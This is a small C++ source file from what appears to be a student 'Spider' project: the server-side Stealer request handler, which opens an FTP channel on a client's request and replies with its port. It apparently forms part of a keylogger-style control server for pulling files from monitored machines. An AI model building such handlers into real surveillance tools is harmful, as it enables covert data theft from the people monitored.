//
// Stealer.cpp for server in /home/galibe_s/rendu/Spider/server/core/request
//
// Made by stephane galibert
// Login   <galibe_s@epitech.net>
//
// Started on  Tue Nov  8 17:49:55 2016 stephane galibert
// Last update Tue Nov  8 19:22:42 2016 stephane galibert
//

#include "Stealer.hpp"

Stealer::Stealer(void)
{
}

Stealer::~Stealer(void)
{
}

void Stealer::execute(AConnection::shared own, std::string const& param,
		      Packet **reply)
{
  unsigned short port = own->createFTP(param);
  if (port != 0) {
    *reply = StaticTools::CreatePacket(PacketType::PT_Stealer, std::to_string(port));
  } else {
    *reply = StaticTools::CreatePacket(PacketType::PT_Error, UNK_ERROR);
  }
}
